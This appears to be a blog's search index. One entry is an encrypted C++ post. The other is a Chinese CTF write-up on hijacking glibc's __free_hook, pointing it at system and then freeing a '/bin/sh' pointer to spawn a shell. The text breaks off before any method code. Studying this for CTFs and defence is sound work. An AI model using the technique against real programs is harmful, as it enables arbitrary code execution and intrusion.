<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>C++(1)</title>
      <link href="/2023/01/19/c-1/"/>
      <url>/2023/01/19/c-1/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="dddc85d3e527e10797b78a6491716c0e7e8cf247413c2f5b58566f6699e8ac99">88dbeb29ff03fae5d51895e173a16628732e7fd04dd9451f5ded42608ce07000d64ec6582f1b5e199e4b147ff43663d1347f63e06495156030eb66c9f5c4199f928dedafb02d2cd6cd831a27905b2f6bfaa4c2678a09e41e9a6e7b70a0ed1047fbb7ae9df82f7a19f7c513463cc347c4bf69c397e43da18841662f8ec8a8303143666677012b2e317279a97be1407751d69d6f0664a628d141340a6df827df411f14f3dcf99d709d7ea98ac83710f17bb24042dd1d4a143cddecea3996ff276e334529585b09220a8784e74e9930bcd331da60093a99cf9b6f8c3c799ec6f572a1eda81fbd4187c8df03fcdc76332bc4452c3a1afa915bc52f02e31900f08c7db6ace11356d4216ff98d27bb635443e4e64154e2d5c502822892475edf2e74b599360342ff78fcc08f3c117e4219f78c26acb0a89871d2f90f838d79c17a92605fcfc7ebc276f99a96d4867b86668a95ce4ae79f6ac6303a669599d017071f0bc29f64e10374968bc194a43a76bf516ecd004848d6e10dca919b7de1b29b0d4acc5492d8409c506385413fad8482ab953e8530675dbab463db4903883303562c3b1c43664fad5478c44b33cfcc25777b62fbe165bce8cc0354e231c63d51efafc7d0a1c02cfaa4dad29396933c87fa1213f79c8eba454b511f3897bce7d142d42970a5ddbe3696b868f9389016805b15303b16547fc5578713fc7dc3c9a0407ff1e1e45e5a53c1a37852b28d283c6ebe53c18fda341e1bac00961b0616bd9d051dac2575026a1709ed0008735b50021e69a3b8174298b9b521fdb517e903b3becc1d1fffede176dd8a6c9d3325baeac41973b9f3ac0d0008ad5c0af162111be9b2e71827bf44e92f03f30323a517f9766eedee435725d0ec33a34586de0aeb21e2ccc8f9d2a8a9c95ac594bfa684a57f32b43225dc2dcbef3df2caa4b7ed634e0047e01c7beabe1f0690dc211eb0d8c427485e78eea8cd6e3cddcd653be1d7c67ffbb9395a2c34665451cf8fd0c691b962d47e09a4db1a9e88f076f4ad1a42bb882f1df73d9cdacb29411ff3e6d4368c95cf346881ed6767f889e4bd04ae7c8cd3aaa43c9ff44beccd79984eaddf91c590b3a644cebdc5c128b3fe64d14d56fa26959ec362673d96ba2a2d87a26b05b50d381b2278058e9b41a367ea2d1b0c907f5cc93a797e7c72bfcf917f6e82526625c75dae586b18399816bc4aadd40992607435673f30056764e935856205a667af7605dbea0d01a786bab50495c091c6e800bb9acacb2be5f09bbb5da9afe288f80294968307b13a8493fdae8dc96159ac99c6e2504d2b4bdca5dd09c4f68da7874cde5d8dee20206f94dce5b6e97351f14f651d3cd81322927d4e14708b5e980ed872c30d4212b8b2365876501c31adcf6756a6af1e8ec58eabe81b510ecb770d3e372f061465c64535fe6dc64ac338acb324efa7c85deeccd65e923158346537d581de3a19cb258417ab6a3bd6b0c1f0853a1660b0e39e50712af2e51393345e4c01491ca5b587616710c51d04054b17956ec420e1f85392915c0a1e1969c30cc37c765e3d21ca76431f82e97104e129ae31771dc05f41ff3e92f385c19fd5bbb7308a56aea7994f6243ce8b3f7255a5ee5d1c4be2b79322fed3b1744280e17996c617aed10694bb7fd7d061966d56fe5355b2601151b6bfe63337d22aa75b87cdbc83fb183d992057d0d17d413db701aabd6146c35e5cf438da7d874f47f82653734cb93d8dde4504c926f86a054ebe2cafa77daafab69b05ff2225e0b54fa6aca6b078e5ff70ca66697f716e26d1fd2d2628dcfce7d4c1cc05163b0b7b939f72e0fda163d97fe4e0cd9aa4ab6273e3c5a079bd555d77ccb3e6a30ff69007b2843dfb41f1f59ba8a734fa8834363704653ef339ef0a086e3db96c74f7f6a4f68c15c9c18c72c3758edb68cfdb87bb871f17109242d2bbfa837051a81bbc34ca20f0734faebfe2bd84e2db29aa3162d35005db042dd18a4e87cbe514326b9a788f52c61a280acc48111c6f66fc905aa2da709c20321be8709a6cbd9915f00b26f0110af11c18727db2b2df5c20a565a798d4af3c6af5c56a29af45ea2c5346339dd7a212c67d339b77c67cba6cc60356591c53ca3939385fd1e119e80e8ca9c51f8a7e4917b6c90b1d1d67dc8babfd53fc13057f17f4651f4cf2465e47d540b7b9a4ad3fbd0c11816baa230d8ef11be4d47149ea5eceab3f5e0e2a23f7fa6e16efe4416ea48c928a9188c96eb0bdd2fad5eac2765b48f331dc5a229b3ecc8297936e83d1de872f1b089f055b38e544496377300d540a7bc25f5d30c85cb5ac559b30b469b739b73295dc1f3424f5d26685a687a6ee53d61f2a8b3782f2435782b1a50e3719a3962e0cd32e49951484644439605e1a265778b3a7f5eca0e844587f0eb90588f89976fe51d865cdca78a9925354f2d4aae4df99086759231991a207eec46750594087571c806a1a23725898f9db3711829877862f0e8028b8f3599a2cdd150fca1f51ab0c347b074bb903f6a8b1c15aeca2be6a40c840adc1689c558e2fd5c15a3f80f481cdf2e4cdb2634dcfb59133415777e8ff3b71b872378bcc9b98cbcf6e4b81c4d7937813410f2aeeb5d069888c96b2319bd93cad289029f1ae8c46b29f0c62b0b71413dc2199adfa5304f5d28c083a829300ec989bcbc445eafcc27a144b8c57c47a1d87c552b02af82d92976b0261ce00f1c4fd8ba76870630d36a32e4b1f6debc60a777bbe80137d301775c3e630375cdeea1b49879ee40bf72cef14bd3531ca41ea4dbde97f81204c644cb0825a619aac3ad35b9e5fe093332e7c56bd11bb56939d43569b04e391528cfd9035797bfb8c33f3a6b2023e34e96b29a44a9ad40b5ca8bf560552dce6a811f1aaeeb8949f916add4d66e4515f6e0cbf2904ab3c0a05386dc716a08ccf668049def2ce798f4c6775eb23b9791fcf2664d48b2739b4ebf160b745f98ed4db2d27bf3dca3c6268e760483cc85fef6956b6d675467393375381eacea32b421dc333a1e5b19ab1818c670689e1716acc3126144aaddf003e46451dde45f734ec661c6bcea6a76a8b993f9af6ab4f2498f3651a7ee225e612753f716874081ab8c3a94447a4e4f1048f27f9f4c0c963eb3c965c66d58d3e6831fe1c235b310f03b7272746acdc3dce0c2c5ac2790e24021554ef922766d8275d8a369a2277aa5d262c6de3ebd35892d379a7fdebeee5f07afbfcf1c63b7cc1b6b49a50cc56393f8296d6eea2c78c4d4ba37168c925112e704fdb3d2d959c6e3bea550693f6e32e8dd00d77ac6964a30b3753864f4912870d13e266e1e1e412151e17259a1ebd157689120a303f6ce0431da5a1fd91c74f698fefc7110a2b9a438f614d272e9e3b409aae5cf756d4f68ce901d7c9dedce866cfa18d435bf49bc82489d2fb9849c2ac10e559aae02eac30299ff8a2f7038f0715db7291887c67899117dbccaaa8f41c545c5d42aaacd81d8d25603f7391c8f9f5460515757d456388ba780b10871d2eccd7fed70e526def97872253f897aee940a5727902232f2b322ebab62a27cc74330171a64f881df1db09fcaba9b3bad07eabd9c9aa1b74662d0c0e81618c13bd5f14310da220af708571e5029eda006b32032ee9d768bba879e5f865e647ec5c8d877e6629a6129d79b848efff54b7f0ef143b515d53e1d62dc88f281fc8c67145880c633934629f7b2a4d96811c525d6a3ad3d5dba5c281a85018aaf3e43131d101bab0a47a7dba92e2070189b8d9fa7b9811f411855eed3def076d4a29989b3b155e63e97f46de9140dcc752bd6d2048787f1d3780c67976c92e257807339e22ace17b45a1063bb2ae1c5ada995f64996677d86e5490fa359a4dd7e31080d853bf8a4f2db737e153ae9c05222e69a19d72cef1994f80c9c6383a7bc89dccc775c81a1c950fa8d19a99304532af5eea824795effd451c3d4a35185f300778de26da8a4c5a10ed678e85e3b7cbf97f8307535e925c442da6df2f49ef9128453c2653335470f64e9eb6f0dde5c3362db91239697822ba65e78b75c0aff4fbfa4dbef6afbf13b201e6c0fbbb1697faf7a89ddc84b78a4ef9c462584d4c6f9411d1367eefbb3e7c910e74a13c253224581f563177c4364d86606bc70c74b421bc3d375bd17e5789d4c8905142344d976ecc7b19619faedbee897cd52c7d7265540cc8c7c86f5b76430fa8ea7b8e8fceb0de9e8fe251c149b0363d60475c64a63af66d9af950976d1393cf82bb76e7bf01778d91970e90a2443e68c55edc24c043224b910d3d6c3d9e24e85711347b25e0e13095e6c37a4063844ef6186aacd072c270ae69c74a5892843b5f6a972988229427657a95ba0c5c9f9188571874bd219e6c32ad86e3b2a2e0f406103d65f08006dd603ad51c48b2b303d8e2c4c867949ece5151a48ab1ac03d2fb5b6a9a4461cb116f2e54a539e259e79c08464d6a2cedd56aeeba68354eefc91ff7c974c990490a47f8f9fb305342ad02ebdeabc9d68db75d126c0254105b99a1b821187a184fb1e7d72c75897723e1275b7b5d0836ce4596887ee4d7225dc54ab16b2e47514d885a3e14590b3cf7f0d78609640a4f5d01e77119db521fc9713f6763bf554f0c5467a4a2a48e3abf95d21799ea52f9c9ecace3456bc84da17b12ab61d76af753aa1068508ebb45298345e27393c5da5537d292a94a9f01775177de0523b30d19c8558780b2b78b26f8fc886aee81779a656d49edc4f84fb5913b5943be3f227ea97db04a1270de2ed5187e6bf3ff84a415f72370a3be2f8a0fba0463af1386b9304bebb8c75366e4a0507e2dd726e8b4c75c90a25e561379f95c8d5438f8ae0b1a870a726717752a33036116dbaea06435d7feb446565c9084f092c21553aeb6577c8accc7644efa1d20af4f11d237e135e65661d2f8e7f2eac535be410c9907a7ca186d52a2471f52364b3a5779c376c935ac50c2fc7f82d8c0f3d8317a16aace343b077d534f83f6a4d805fad7465f1140387b798765b7ce980e196abf7ee848035a4712eb42b2599f8417b7f29863ced17e18fb55582861c6bddf951a7c929679eec2018e857b91cb74ebc7864c0365aede84e941d424d75c1000dbaee54045a78a152b51d0d78c56648899c818162402291786a5047ac02f5efc8953b2d0e82c234bb3354fd38ebb0bc0fdc1d40cd1ce8f73fb6030d752e7061849f8e1c2d6ea251655803e4ada65ad89903deb71a09ef14b60185c0d4171b6e07b33962de93bfb3e93e880ce20bfd1f7a718b333502a530c89319483ce28c837bc94ab033164cc0866cce9b6fb6ac739f6273be421001ca24d332707dc63bb4f87956c134280248d18d2a70900317b38ef28c75add92fd538bd300508c0b13fa1a8777e4e9824d820079870d40111d0d51c9c3f8449b4af2c33215a2bb045b816e0a9e416e0283f8c6a308990e8e972e055297e9c55ae0d38c281ff52a1f519f01038f405d60f1c5b547c577129f6378d46826160505f52105e1c4c718185eb5770f9eb05c0285eb1f367cb4411338550f83c4179f0ffea66c35b4233317c98147a314a0b4fbc1de7a33a64ef1139fbf420ec69f9ffd328a4f3798ff60d5fe21b452b8f4c8e21cdb8a21ead67e9e908a7adff6fdc0166ebdfddde6c06f01b96d90400b44f8c28c67e59c8c6e0d799753d8ed5807926e182c8ff163c6d7b14ecf91ce50150b94628f0180793f6af635f6c79ac6e06a01eb7237a8902223fbbd7ee1c2fba226ceffbc6d19f7987e46670995b987bfb145f82d05c38b965eb90bd145b38d8692918c0975c2aae23c1f06fce20a9c7a35d670e673d7b0fa9b33fe8ff037e29ca5340e23a13a1bc980944168969852e8a8eac99c92409a8734fddbf68a7a4b3a3239430fe2c1b540f57e7ca7702b359a92d45c2f6bf24aed29c2b479f4c8a679e8cb1a8265571b2920925c8b89e80a9b9faef571f00b54bc35b0bf5c81a5b35a8efede3bfef8a2998edc66e383bc66e89908c95bebab3e616b0745d77abbbb8cb1323387dbdbd0b80144f922a62cf64a3c75725783b13e4cbb43f1b0fad6564a9a14499c08595db5653cb0b6ec8da5e6f0af03c60f888808085684d1c7a8206ae885d0485733ae23dea182fcbd12ad975f62a0e70935439ce37009a3e25484b591ade0cb3d5acbdbd7af3ea8cf53160d600f7df9febe13ae947d784b25745fb33cf3081a5e18dfc9e1e044892a45de25eeb8b4216c4e6fa02f62905a53f79284fa6aeb94e05e0dfa81246f2cfba700034920eba2090161efef37875fba3b5786fb403f642bc60535d142213fc20200613c46669c27efc670926b1c353050f8f7f01ef832474ec4d1b84fd42ba341b300a49d1f728d544f9b236d024fdc08ee1122d2a02bd6ff54d1d06c996a2a5be6279ad47c5ba014e22a5a8542e595630a8090b52a49c7c630828d81841170e018b7a011df252e791780b3ddc038b7ca0fab8f0dafcc013f3fc9ccfe187543bbc6c3c72ee9d8015ab0b35090e1eaa4d8b17958ad3b957f123375a3960f2216c9481027789361ad32d5f34646ecd939c6d5d51322fce0789b947ab07fe2cc95cbd962c8670935ae3190a4b40414136390845dd8475106d6d1a241d16c800f6a4b8c0df86dadb4969c3b1eb40c81278e20426d879da70910a6f9d0f8c0f6e98e50fc24fb930953bf895032f46adcd3925c0aec37570f180417817961c5186d4d2fde7936168503e790edd476f10c491e1c9c54cc9bcffcfe121a688749e4297e3642fa6183c5a12bbe005807b8bbcc0022b5e971e630d03938571690d82c339f365f474f9e11ecafcbba3aac5c09934865deb6f0b089c3516d05b529616a0bddc627e2a69067a3ae97c61c01fce203ee479e197788d916db7aa3ff3909455366cac8ea85381d679b0d0f9c02e709cfffb3d4672b0210085a893fb1741943e25a8f9ce480fa205fd0bd44aeb48cf6a6bbf967e09b6d1e4ef2dcf3d07aa68457c2284463354e4df2b0e596345ccdd2724494b7fe3f6a0a2b20ea353ae3234ed28847629e5b2f6775bef2ea9073f29e079ed9556b6f444d02e5fec90510beb7c0a2989ce0a2584733d334727488e4e2887b5e78be56c8934c504b96c82bbd472060e0e0da10b140438fdc7c3a673dbb2e7cd9c6c91332c1bfaa08256be71889f3850da39d1d53e1f27ecc771be07a0d5b3a71c24918eb4274e45c3026667dc02512bfa2faf05e4359af2930c835a4b9b47cdc199bde0ea060d82fcfa248986a1d0bdc487f909dbdeb081520b3deec383d6a4ad6c5b13c197a0ae7aa82400a05792fe9e33b4e6c234d983115c72d16074f25dc6c88424305fa34b3b4aec2ea6869d87c77254952bfe918dab6070c1b823edb7b31e2193938d58a2ebcde4898305e134af483f46bfbb9d65c62a0fce1a4c42e1bf343111a61ef2efa856f9f581473c0b93bec0fb2c78f6f32f961c171b2269bbf0f96bdc1bdb256d0d54aa06538b028846fae824ce7b635857f6964ee38bdaa8727f30d8993986a698da02cc5969103904273b0f5682c61df3e265e89700bd2c1693f69ded5c625dae412cd2fc713231280dad8191e21fe8d9b487fb176d9291245b30f008e047d24248f39d85dd647976714ecd0fec390ad01808287f53f00b9e013aa176769ad6736aecd274ba85181d6b74b7052182a3b0089c1e8ab52889d3103ade6dbaaf4d4a788b20f0340a5fdc3d93b6f760b0bea62165a78f60009de5f9279323a30ebe8eabbf210610571d751ec0cfe0e41b30298cbdfbbd0f748d3c0beb2d5733187c5345c0e61044d25a7954ce14c3d438136284876ee460115dced91bf9fc191ad0f56ac1fce049ed9435ed101d67c954a67563a4c59af18c3873bd47fb406a7438ae441fcd3ecf484d30861aeb5935d0f34c199e6d9ccf0ee37b4885d8f4efcd3852da7d94fd44c93b45342a82bf933a0a85880829407faf01042915c1e8eb77568b8ebca0a2761abc77305b953da65d03f9ad743e3503dfa413b6b51f36d780e162c89980a863c52bae9fae7bc033a335365e66cc5ec433265d3213ea2185d22e494b0b68a49037d90b6111197efb1f37decaf74e6f962b39f85d7dcf60d83219a8cef5b903fec88ea5fa2d79517126c7a1176e847f1882ffea84cb6c5bd5acfbeb63f46837d97f1b4e60ef4a2c670f323bf86e23d5c452d5dac8ca9d7f55cd2bc723904d67881ac2afa19a5e1f0e3eb466bcd6730f4c5e85d7c50491f3cc1e36d13bf5d529e03407d47ccd643e8878d9d4cd315c371f6497b69051cc177c86eb30708fee2edab12a2cd4c802371fc316be6971d5bbce1f5dc23b18090eb02c384b947c1e1265ffc5471102626dd3601bddf976faa43a9c7d7db61754d43aa2032c920c05017df3c2f96080f207b5aad26b92490506510fc4b70e93488ed2df87eef74bda248cbf304b6c9809ce691a1f5ef53d93d8e1079821c586829c5a6087a2e52fc0f163f5ea906f6e2134ac63604b00a533b070b11b117a597cc26a34d0f5dc501ac682e61da1c7dd6f472c596ecde8aecffb88bb3aee9f5a22fa3188c7ddbcdeb067c7ce0c60b6b3b248352a4a4df02ee78c0eb581473d6cfa952a44ea3c1df794a49e080da4197816efb91b9814d35e8618d7174710e99e4ea2f203f1f730a42db1965ed5e8aaa7ae7608ca10633d22c4a71f3b97b8d242d78678c96ae6b64b5e9502baba951135a9837aeacb45b325bfc001434c7fc1b55f169f3c79aa81e26d94dc7a1667d2b18c1aec768c2d426ab2210ee874e247ee390d4ed532e9d6e02eb93c74b568b2c252ef55d53cf2f8dd207d0d822e551ce6a5aec0398e8548f9771d57433f91e71f8800552881c6c19da88238a060baf471553c120a1f2531e85e343ffa43d12538900d9b95d72fadf3581fb70d6cc40343149b50b6f31a02b742573f9e2d28de7ed22fe816a9293b904e7ee0ad6b764677abe8277e55645853ca0909d4d5478e3e6cfaaa5523a73c867b3edb973b94a974127c6e631858c0681589d05355ca29b0e342860ecf46e6473f34e8d7fd3a3d36d558c4c945654fcc50258de2dc5e5603a5fd29da8ad70a33044cb8c864940ca0c0b25c43ee04aa10bffb18922435d89d714e4f2021cbe94472a703c715ad0d19e29e49f4f499f8cbb45a2fcc30f9ee3fa8732b08f69594f5acdcbd96d74f2913ace9932befbcdada9055c297bcb1c145dd61a701ba2a2a1bc9f263203f0e42bcc44cc3f25bde072b030454e6cc4ec9e54dde4f00e484beb3f9074a8c660e6ed169fd6d26b519a9c1e4244bf4e31570b0c8ee6ee585a5cfd0071a7eed6890fffb1269443240e1658eca4c71d66dd8ebda9e7efa4f7ac8418f1773a02e591cb778d7b13b98fd82958955f7b736b3e9d4caab1dc48cf590c1987223108713f24ee787c5fa53d9eb9e92c17acbb48ae64d5853f2a4e41eb881e0edf347c3399529d9b53ac149d9330d3a2beeb29fe70622d1d77a831acbe9a655a2c889bebd7f30bc87e15ef22c0ee4f1db3ba74c6b6c4916cc51aad4aff19ec44747b0bfaf3a77d8e11ba430b19467968de66d474dfcdc928f24471686090cc481e4f4281edb9e63157acafdac933d29ce76936684115fd1601979f2055850a06dcc883a5e87e81cda43504d5815c54ce1b73778eaed23be7e43724987673c984c0761aea5d460f3bf38ec20f931c46e0e2e30d1ad85d522f842959fba68058196dbc3d12b7d4e47767d0c8b7b9bb2889b72be6a7ee84521e714fb4c73d769bf0d53b99f6441e01183080023e04b8bdad5997556f2e95c47bce36a5b5a24bc646fa016ec532bbfb108e548d9de0e9ca5d01861c6a458c586f4c51d81fa10c881a9862520f4276e7dbe635cbbedb34eb4f83490727efd299138869a55f048d0b58820dbd411cb8df93774630026eee814230038c2a7aa18da43817ca05926e100f3cdbf1cf804d6445e645d3d12bc35813efdcc24b4c65bed9d4f8f1a58f66320725eeeef1f2a0d36907d146102112f5e2605f84e5dc4948f51609b1fff8b3a8967c6ad3494885ff57b071acb1ad54dabd89ac3047f7cc190af8b8fc304cd54d7bd48b9a5a1f1fe9c484d3f5e6009869b81b5dd773c5bf71bb8eabd69f205e540c0c84c2a88e76d4d77fe2845e71d9f49ee47dd4f32acd6c04346d8cc52ccbf709eee5382b201278bcb61a6d29d01efb0088d6bc71a9e5db127154ad39b90152ae4f6e03639548cec4aaffe506b83e9f6df031a63b87834b1af4dcd5dbebf1aeb2147cfbcff28c8907916e3e8bd4a81a2fbb1ce904aa43ba956aef7a59995e6b9c1d03e4661888d012a3671e120fdd1e073e4c7b632fe8f5b0fb880753731e2b40e607a0e8adca6ade2ef1717da68330423e38ad91b3cdd320cf1238d92e45e0cd0945f5c3c07dccc763ab806d03e0b29fc8c2ec3c154ccd8a9f12e828841d85af6aabf46054c1256b623e6b1bdd67ee0f1e8baf3e8b8f99dcb038a6e9ed7a9ead34c8142f6539332b99260e3e407f7cf0eda9f043583b1a36240510cf34c7e109148bff549ff96c82cd8224494f74f0e57ac132bc6119fcc78b4de9115e6193a999e19d0f6d061db1bdbcbe6b9b1137d4ae2f4894aa8f24f23f2340d53dbc60ecea728ec848860bb4b60d3713a0447b6767b78dc2e92a915ce6f8f86c97ab152c796a4a9d97dd4e409e2b639ba1cbe1a98d249a3bdf7f03251239133bcd1ac7837428f498753482f8cd81e1764df1f0f02a0ce0cc91e022a7a7d41182d193a13333fb932b25bc13f9c299be154ade429b65c0e8a59531c0c37fe114f59ce68a6d103fb2643dbe881b70ba0c4e4b9fa6eeb252000b681cbcb579ee68bae7cfa0573af98ddeffeb08d906104cfe7c88fe2186593a20f9da7c946b79a684ec53cdc92e571b7f09a776bcc2557ab2a3133000fe4669f943636218f61537db7e139f036372b8a565514a56344d72b8f202b217ca20ba493f5a9aedeb35e41bd20051c2cfbee964f47ec9ca507b00a13eedaae1019789323fe83b6f547763d4bf8b6c575beecd3702e92e65e8aecedc4eff7e6ad8cad13ec08f870b01df988e478b576393af0665b265ba9831ad14b702997d0c8e5074e603def23fbb231f74b020e98acfd029fbf4b516ffb7e82d5f7c2fdae6c0a6f9339e3f1ef1a45448dffaf8f483947d59444dfefd5cc830cf138f5fe043570b9955aefe3b2ae64cb241a41a10d9f55e8cde6a39110f4a72759adef362863e76c0cbd94b0bf76c57e677f4cd80736857393b9005f56e49f246ce365ed5f15ea1d233b2f43d718c10a69fd4b03838d5fd75bd627c2d2519d2bc5a88fba09cab83f402844a056742bdf70270e7d87f51f9e51accf0ad4d476c9f10e912ab73f6a61611fdd8b913c2c90de124c95d22885287a7616b1b2e539c835e4c43130b9f3648429076c94ebead83306664a0e1dcf5a695239043ab71eee4c2a4931bdee2a7f8c9d227247a6df871ef95886581d99f0d2dc46b34c2225d28cfed2abfb21d3b5c131cd35942f4aa5155b8b3c2ffa30df276d7b31ecf635e035e666c681bfca5899944ce5e21884a54d5a2797980f6537539ef98c3c7b6456543b85797974e8f9d674d33c4573fe0332384d20f3369ae2f57a57f2e74fc700f852d84861c38491dad20528a146e5bbffa5b418469d1190f0f85c54a5add4e62162de7d13d874dd81fc5b05b87d7bd228ff509d0a77db206fe91b9051d1133577f7d87f18d2a2791300662ed7f092d47104f0bc694af20f09b0c9944d6117e7a191656962554c28af0cd6c97c47a86e41f7776a962e269beecb6c7e9c13406439a58d150dfba236941a89e92b6555725d348b94ae09b7c499124bda84a5cf2aa4beb2bb60eee6f59235b0ebaff9c57652c9e8044144c85d332d73e977ca99a42d48924879f05e67ae1fb206bc2db6754f2170919b1b2a66f06ba3d0b42dbcd106509f1db3c750f95d15eaf8bb4e71dc10088f5e356d1c0d222204b604f9cf0e001cb85b28b88597f761dd768ac49f206cb09b334134721fe58212fd15202e95a9c6fa48abdfd30de9d2a1a2cedf09ed91c4f238e43ebc43acb17039d1c2f4f98ea58b1143de1026c2a8f39c4c71cffc07ebd0ed88ce32d951233f3fb75b1ce868cf7872be04191d2ad1bff85cabec9dc4344beb146996c64bca570973e1a113d28f92a7e62c23ffa7112583b6f9e3a4d002a205a7b8f4884b75f8fa0b343b9d93b48b1293ab1505867e1bd50c88c7dde96cb260e66a82c1ca909fd985117fd3684828afc1d5c1279f84bb73c7f78593a77a94ead0b4fddea0d3dbe8d153138759b2f91b2b61c5e7db05e517e698c48364ab4d74ff3eb75abc5b5d522fbf72f37606e4ffaf02b8d61dc009e3e5398c404398bdbbc88c1cf7dcad5f32fa189cc58efe7eec6e2cc8cfa4d7cf13e7800324826e57ed38f21f573c53e727d2b5b1410cb18097a6c340614208f15517d22405a3d1fcbcce210685a3490bd723e17b40da3d3a5e8b2345e144f3aff032fee49b4c63beff89b1059a2263e8b7828322bccea20156c515f34f110e523ad90f9de315ff8507882d8b7fec6995406fdd60fb9de7aa3416ebf5e9fc0bca0a32b32edcb163d5d3f291fcf89b57b2869d04a7a560b761b56f73084fe0689eb2f43f516bdbcff0e4fb90862f88fcba4f0de38b3fec3da746426180f39615497550bd6920f3b06dbcbdc6cfd88d7909a61f185796c5baa1854706f4691b52cb7c755087d83b2d6166c34fc93da724affaaf996d3a9a4e01fb721d41d1a36c6037cefe06b7de114afc391446d756d756de7a117e27d65215465de21c1ddfdf348998c3a0c686292a7a681c4f1d74131de5d1275aa1097d55ad663cc1d52eccc4023550e75f784f7ec887dc036294d450a9f6d18ca92b1a7f9ffb8ed8778fb1ac86c45f1cad2103abe6ccb133ae67006623970d046ddddc4754d8bd2a81619d838228885b30323c76e7476f47de537561378a15642e32390ab3c44231ee4b97c2adf57fb68dd9e64492a151563b7153762a2c09418a8e3850492f24c13c8fe6b0e413ca88f71754cc5d70a1e946e90d1c45821025829cd2908c0f036fdb59cdbab74e60ecad7c3be34fe4e876a02430fb425acf842225f25b6d8866a838485cb419e3f85a39f61e747794eb68d21b9bcb1c1d69c0f211f381c1fb49ab94f9e3b20f399d4479cd2eb83a0f6739c862ba2eea7fccda7dab9abaca320488f7010143f26444a5f2f26170eeec276ecc0dde255f7b619ee1433ffee046daf8fa8f01d0a91f202635734fac830623319b44a91120995930af4933f728cf9871c7c6e9bb6e32dcdb39b458beb3a5a811ec8c806d7cd781c1e69fde233143364865ad848a24bb75b9ab37ea8949a4c5e9272f0ed68e786294da9c0a987ac24dd32a8803ca696b2f699d5b88cad827dab138f576b9ae4c442836aaf97c169b4c0bd634bc321de085e057137e486ccc0bc752a6126575140cf43162d67e065bc1b58b53f318e611b7ee1f3aa4a2527fb227503749e189171fc0384b7233b28f4925df69b43f2d3aa8abae61e6409ec83abdba3297d933795f9a7028cfb83e71306a873d461228c3860d20987dce901dcb66352c2223bc9c114b83d7d3eae0292623da40d165ffd14146b4d949a4a2f7704c4b7cb8aea8a7869e41c5a9cd7ffb4355872190c04e93312bb3e0123c89ba9638c9276cee86567b5ba2fc5cd11d2036823838eebe976b76bc24fe6acc4c58eef138d59a9b00e3e91de39433275cbba732438d1e662e0c38a597a9833b35596de1ddadd0307cd2f60306eace9b7fd16d6c1bce96902baf2300d548bad252a860c02fd9d1ff64d8f7ee41c462909f11c9201cfff01b37a20a8f0ffb4ae665521508ef5c07bd539dccf27b6b7573d900d4290a318d904abd44177727f8f24f12784fbb3a55081ef01372981cdad4f7731d390646c3886d4b3ee686ceb435e1c9b0e5a08d884b2c6b6d16a47a2374e213e72ba44b54d109722d4b565c24ca6419798c280c9f7c556255385bce0f7bf398a05450351d567c7e3294f350c994a9f8f8204247942b2ae70ad4231e953d00a9ec79d7c0f8028b8686f223e45bb64681518f7c9252a61450c5663207cc4c58f3d476794ebf770f832b9aaae641d1ce8c0d8b769fbc5b0d8abf3e193985e55993c2ffa26e55c046880da09df193b1ba915a2a5a64030ea0ce0a61c0eb3890b6661c7f4ff6c58ca4c8212ebeefff7d7a68874d1ae162d92c6c93c2d450d6f3eb3b57595acb96a9dd8eb2cc851e66d25ec4614c1a0057285a022249a2c85d30f7c8b9ba1be320741af7495075c221749593cfd49272ccd05f25bf3c1134e91864b8954cf6025bef4e2149f9a6791b82c15d2f07ea6db4e60edd03cf9f49099521b5664ccb245ee6ddd5c5b2fefb6da111de152d51a05535ee556893a8e68951e85374cf43a2f5b63f95c895abe74e334d79762bb1f1fb7b2f0f175557bdd1d3e97ab60292a5cbc8b529de1a0230576caf105d765c916058634431e8124863d2910c1c63695bac39f6f7e0bac5e84f80a9ff43d546a66de7ccd2eb0c0a7f080bba3d8dc5485e4a170db6a1a42efd1103da045ea98cc75f15008f409f8e56569921263a226ddbce48298e8f9c96d0d8f1710b38b8e55360168fe4942213ac0c7f1591f8c30694621e05a7d1ec4467168f4d0e2d2c51a294b9cb88620842f5052f572a9918b05040d0907f1c0c39ebc6e1ca40212d107e0c05425df7238374c674dae8362f94b3ec8494c58adbaf7e809a8d6c1324216cf9ece168674f735d74c439f3c491821348584702f87566f0a06b29c8cb0ecaeb882a60440df4095a67194bd64b1669b29d875f30db7c9cf6e33206cea87a3514413a3d8c128b267a171483a0e424d6c65d864c8e5df92de65a8eabca988b4</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">私人领地</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>free_hook劫持(glibc2.26之前)</title>
      <link href="/2022/11/22/free-hook-jie-chi-glibc2.26-zhi-qian/"/>
      <url>/2022/11/22/free-hook-jie-chi-glibc2.26-zhi-qian/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做Full RELRO的堆题远程环境one_gadget总是无效,于是便来研究一下__free_hook劫持,加入tcache之后的__free_hook劫持比较容易，本文主要探讨glibc2.26之前的利用方法<br>要有其他方法(或是让one_gadget生效的方法)欢迎qq交流</p><h1 id="free-hook劫持原理"><a href="#free-hook劫持原理" class="headerlink" title="free_hook劫持原理"></a>free_hook劫持原理</h1><p>在调用free函数时，若__free_hook的值存在，便会先调用__free_hook指向的地址，于是可以将__free_hook的值改为system函数的地址，再free一个指向”/bin/sh\x00”的指针，便可达到system(“/bin/sh”)的效果</p><h1 id="free-hook劫持方法"><a href="#free-hook劫持方法" class="headerlink" title="free_hook劫持方法"></a>free_hook劫持方法</h1><p>不同于__malloc_hook和realloc_hook的劫持方法，由于free_hook上方一定区域内(<del>大概率?</del>)不存在能制造字节错位的条件(<del>有的话也超出了Fastbin的范围</del>)，于是直接通过<code>Fastbin Arbitrary Alloc</code>到__free_hook上方的方法基本失效<br>ps:补充一点,gdb.attach上去可以看到free_hook低地址处正好有个7f开头的地址，不过这个地址是__isoc99_scanf函数写上去的，函数执行完后便清零了(<del>血泪教训</del>)</p><h3 id="1-篡改top域"><a href="#1-篡改top域" 